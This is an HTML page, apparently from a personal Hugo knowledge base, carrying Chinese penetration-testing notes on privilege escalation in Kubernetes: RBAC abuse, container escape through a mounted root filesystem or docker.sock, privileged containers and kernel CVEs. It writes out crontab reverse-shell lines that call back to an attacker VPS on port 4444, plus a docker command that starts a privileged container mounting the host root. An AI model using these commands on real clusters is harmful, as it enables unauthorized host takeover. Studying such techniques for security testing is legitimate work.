@@ -1,0 +1,91 @@
+<!DOCTYPE html>
+<html lang="zh-CN" dir="ltr">
+<head><script src="/livereload.js?mindelay=10&amp;v=2&amp;port=1313&amp;path=livereload" data-no-instant defer></script>
+  <meta charset="utf-8">
+<meta name="viewport" content="width=device-width">
+<title>K8s渗透-权限提升 | My Hugo Knowledgebase</title>
+
+    <link rel="stylesheet" href="/css/main.css">
+
+
+      <script src="/js/main.js"></script>
+
+
+</head>
+<body>
+  <header>
+    <div style="display: flex; justify-content: space-between; align-items: center; width: 100%;">
+  <a href="/" style="font-weight: bold; font-size: 1.2em; text-decoration: none; color: var(--text-color);">My Hugo Knowledgebase</a>
+  <button id="theme-toggle" class="theme-toggle" aria-label="Toggle Dark Mode" style="font-size: 0.9em;">
+    Theme
+  </button>
+</div>
+
+  </header>
+  <main>
+    
+  <h1>K8s渗透-权限提升</h1>
+
+  
+  
+  <time datetime="2025-01-01T00:00:00&#43;08:00">January 1, 2025</time>
+
+  <h1 id="k8s渗透-权限提升">K8s渗透-权限提升</h1>
+<blockquote>
+<p>文章首发于track安全社区：<a href="https://bbs.zkaq.cn/t/32483.html">K8s渗透入门从零到一</a></p>
+</blockquote>
+<p>一般来说，在k8s中的提权就是尝试从pod容器获取到对node节点的控制权，甚至获取对云资源的访问权限。</p>
+<h2 id="rbac权限滥用">RBAC权限滥用</h2>
+<p>类似于我们在执行中提到的打法，就是获取pod中高权限（比如绑定到cluster-admin用户组）的serviceaccount，然后再调用apiserver实现逃逸，然而除了cluster-admin，很多凭证也是可以权限提升到cluster-admin的，我们可以重点关注Helm、Cilium、Nginx Ingress、Prometheus等服务</p>
+<h2 id="部署静态pod">部署静态pod</h2>
+<p>这个方法在我的<a href="https://www.cnblogs.com/yuy0ung/articles/19076992">k8s渗透-持久化</a>的笔记中已经介绍过了，这里不再赘述</p>
+<h2 id="利用容器不安全配置提权">利用容器不安全配置提权</h2>
+<p>即容器逃逸，这里的很多tricks其实和docker逃逸没有很大区别</p>
+<h3 id="挂载目录逃逸">挂载目录逃逸</h3>
+<p>挂载的方法很多，例如挂载根目录、挂载pocfs、挂载/etc、挂载cgroup、挂载/var/log等等，可以直接看我的这篇文章：<a href="https://www.cnblogs.com/yuy0ung/articles/18819294">Docker逃逸手法大全</a>，这里提一个最简单的挂载根目录：</p>
+<p>比如我们创建恶意pod的时候，根目录挂载到了容器的<code>/mnt</code>目录，所以在获取了pod的shell后，我们可以通过查看pod的<code>/mnt</code>目录来访问查看node的根目录：</p>
+<p><img src="https://yuy0ung.oss-cn-chengdu.aliyuncs.com/QQ_1752337790318-20250714003958889.png" alt="QQ_1752337790318"></p>
+<p>接下来可以通过写定时任务来获取node的shell：</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sh" data-lang="sh"><span style="display:flex;"><span>echo -e <span style="color:#e6db74">&#34;* * * * * root /bin/bash -c &#39;sh -i &gt;&amp; /dev/tcp/&lt;vps的公网IP&gt;/4444 0&gt;&amp;1 &amp; disown  &#39;&#34;</span> &gt;&gt; /mnt/etc/crontab
+</span></span></code></pre></div><blockquote>
+<p>注意，这里并没有直接使用<code>sh -i &gt; /dev/tcp/&lt;IP&gt;/4444 2&gt;&amp;1</code>，因为cron 默认使用的是 /bin/sh，而不是 bash，sh 不支持<code>&gt;&amp;</code>语法，上面的yaml文件中反弹shell的payload同理</p>
+</blockquote>
+<p>我在k3s环境遇到一个问题，在收到反弹shell后会立刻自动exit或者退出：</p>
+<p><img src="https://yuy0ung.oss-cn-chengdu.aliyuncs.com/QQ_1752384892469.png" alt="QQ_1752384892469"></p>
+<p>这里其实可以偷懒直接chroot一下也行，但是这样只能以高权限进行文件相关操作：
+<img src="https://yuy0ung.oss-cn-chengdu.aliyuncs.com/QQ_1752342324537-20250714004016922.png" alt="QQ_1752342324537"></p>
+<p>不过通过查阅资料发现原因可能和busybox的情况类似，对<code>-i</code>即交互参数支持不完整，那么我们可以尝试使用<code>disown</code>命令让我们反弹shell的进程不受父shell进程影响而exit：</p>
+<pre tabindex="0"><code>echo -e &#34;* * * * * root /bin/bash -c &#39;bash -i &gt;&amp; /dev/tcp/&lt;IP&gt;/4444 0&gt;&amp;1 &amp; disown&#39;&#34; &gt;&gt; /mnt/etc/crontab
+</code></pre><p><img src="https://yuy0ung.oss-cn-chengdu.aliyuncs.com/QQ_1752384977729.png" alt="QQ_1752384977729"></p>
+<p>此时我们就可以接收到反弹的shell并且不会断开了：
+<img src="https://yuy0ung.oss-cn-chengdu.aliyuncs.com/QQ_1752344803661-20250714004017953.png" alt="QQ_1752344803661"></p>
+<h3 id="持久化挂载dockersock">持久化挂载docker.sock</h3>
+<p>挂载docker socket逃逸同样在我写的 <a href="https://www.cnblogs.com/yuy0ung/articles/18819294">Docker逃逸手法大全</a> 中详细介绍了，值得一提的是，如果已经获取了此类容器的 full tty shell, 可以用类似下述的命令创建一个通往宿主机的 shell：</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sh" data-lang="sh"><span style="display:flex;"><span>./bin/docker -H unix:///tmp/rootfs/var/run/docker.sock run -d -it --rm --name rshell -v <span style="color:#e6db74">&#34;/proc:/host/proc&#34;</span> -v <span style="color:#e6db74">&#34;/sys:/host/sys&#34;</span> -v <span style="color:#e6db74">&#34;/:/rootfs&#34;</span> --network<span style="color:#f92672">=</span>host --privileged<span style="color:#f92672">=</span>true --cap-add<span style="color:#f92672">=</span>ALL alpine:latest
+</span></span></code></pre></div><h3 id="容器特权逃逸">容器特权逃逸</h3>
+<p>同样在 <a href="https://www.cnblogs.com/yuy0ung/articles/18819294">Docker逃逸手法大全</a> 里详细介绍了，值得一题的是关于特权信息搜集时的小技巧，在我这篇笔记中有记录：<a href="https://www.cnblogs.com/yuy0ung/articles/18982969">K8s渗透-信息搜集</a></p>
+<h2 id="容器基础应用或容器编排平台漏洞">容器基础应用或容器编排平台漏洞</h2>
+<h3 id="docker漏洞">docker漏洞</h3>
+<p>即docker逃逸的一些历史CVE，基本和docker的runc、containerd等容器相关</p>
+<h3 id="k8s漏洞">k8s漏洞</h3>
+<p>即k8s容器逃逸的一些历史CVE</p>
+<h2 id="利用linux内核漏洞逃逸">利用linux内核漏洞逃逸</h2>
+<p>这个原理在docker逃逸的文章也解释了，就是容器与宿主机共享内核并使用内核功能（比如cgroup和namespace）进行容器和宿主机的隔离，我们可以使用内核提权漏洞来进行逃逸，常见如下：</p>
+<ul>
+<li>CVE-2016-5195 DirtyCow：执行 <code>uname -r</code>，<strong>2.6.22&lt;=内核版本&lt;=4.8.3</strong>时可能存在</li>
+<li>CVE-2020-14386：<strong>4.6&lt;=内核版本&lt;=5.9</strong>时可能存在</li>
+<li>CVE-2022-0847：<strong>内核版本小于5.16.11且不是5.15.25、5.10.102</strong>时可能存在</li>
+</ul>
+<h2 id="总结">总结</h2>
+<p>可以看见k8s中权限提升的常见方法就是权限滥用或容器逃逸</p>
+
+  
+
+
+  </main>
+  <footer>
+    <p>Copyright 2025. All rights reserved.</p>
+
+  </footer>
+</body>
+</html>
